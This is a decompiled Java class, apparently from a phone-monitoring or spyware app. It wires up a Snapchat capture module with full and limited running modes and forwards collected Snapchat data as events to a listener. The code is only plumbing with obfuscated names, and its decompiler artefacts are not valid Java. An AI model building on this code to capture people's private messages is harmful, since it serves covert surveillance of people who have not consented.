package com.vvt.capture.snapchat;

import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.e;
import com.vvt.base.capture.f;
import com.vvt.capture.snapchat.a.h;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class a
  extends com.vvt.base.capture.b
  implements com.vvt.base.capture.a
{
  private static final String a = a.class.getSimpleName();
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private com.vvt.base.b d;
  private com.vvt.base.a e;
  private String f;
  private e g;
  private f h;
  
  public a(String paramString, com.vvt.base.a parama, RunningMode paramRunningMode, com.vvt.n.a.b paramb, Context paramContext, com.vvt.base.b paramb1)
  {
    this.f = paramString;
    this.e = parama;
    this.d = paramb1;
    Object localObject1 = RunningMode.FULL;
    boolean bool;
    Object localObject2;
    if (paramRunningMode == localObject1)
    {
      bool = b;
      if (bool) {}
      localObject1 = new com/vvt/capture/snapchat/a/a;
      localObject2 = this.d;
      ((com.vvt.capture.snapchat.a.a)localObject1).<init>(paramString, paramContext, (com.vvt.base.b)localObject2, paramRunningMode);
      this.g = ((e)localObject1);
      localObject1 = new com/vvt/capture/snapchat/a/h;
      localObject2 = this.d;
      ((h)localObject1).<init>(paramString, (com.vvt.base.b)localObject2);
      this.h = ((f)localObject1);
    }
    for (;;)
    {
      return;
      localObject1 = RunningMode.LIMITED_1;
      if (paramRunningMode == localObject1)
      {
        bool = b;
        if (bool) {}
        localObject1 = new com/vvt/capture/snapchat/b/a;
        String str1 = this.d.f();
        String str2 = this.d.g();
        localObject2 = paramb;
        ((com.vvt.capture.snapchat.b.a)localObject1).<init>(paramb, paramString, str1, paramContext, str2, paramRunningMode);
        this.g = ((e)localObject1);
        localObject1 = new com/vvt/capture/snapchat/b/g;
        localObject2 = this.d;
        ((com.vvt.capture.snapchat.b.g)localObject1).<init>(paramString, (com.vvt.base.b)localObject2);
        this.h = ((f)localObject1);
      }
      else
      {
        bool = c;
        if (!bool) {}
      }
    }
  }
  
  protected com.vvt.base.capture.g a(com.vvt.base.capture.g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  public void a() {}
  
  public void a(com.vvt.base.b paramb)
  {
    this.d = paramb;
    boolean bool = b;
    if (bool) {}
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = b;
    if (bool1) {}
    Iterator localIterator = paramList.iterator();
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject = localIterator.next();
      boolean bool2 = localObject instanceof SnapchatData;
      if (bool2)
      {
        bool2 = b;
        if (bool2) {}
        localObject = b.a((SnapchatData)localObject);
        if (localObject != null)
        {
          int i = ((List)localObject).size();
          if (i > 0) {
            localArrayList.addAll((Collection)localObject);
          }
        }
      }
    }
    Object localObject = this.e;
    if (localObject != null)
    {
      bool1 = k();
      if (bool1)
      {
        bool1 = b;
        if (bool1) {}
        localObject = this.e;
        ((com.vvt.base.a)localObject).a(localArrayList);
      }
    }
  }
  
  protected e b()
  {
    return this.g;
  }
  
  protected f c()
  {
    return this.h;
  }
  
  protected String d()
  {
    return a;
  }
  
  protected String e()
  {
    return this.f;
  }
  
  protected String f()
  {
    return "snapchat.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/snapchat/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */